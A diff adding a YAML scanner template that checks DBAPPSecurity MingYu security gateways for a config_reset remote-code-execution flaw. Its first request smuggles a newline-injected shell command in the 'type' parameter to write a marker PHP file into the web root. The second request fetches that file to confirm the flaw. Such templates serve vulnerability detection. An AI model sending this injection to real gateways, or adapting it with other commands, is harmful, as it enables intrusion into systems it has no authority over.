@@ -1,0 +1,15 @@
+name: 安恒-明御安全网关-config_reset-RCE
+description: >-
+  代码执行
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: GET
+    path: /webui/?g=aaa_portal_auth_config_reset&type=%0aecho+%27%3c%3fphp+echo+%22Rscan_test%22%3b+%3f%3e%27+%3e%3e+%2fusr%2flocal%2fwebui%2fRscan.php
+    expression:
+      status: 200
+  - method: GET
+    path: /Rscan.php
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
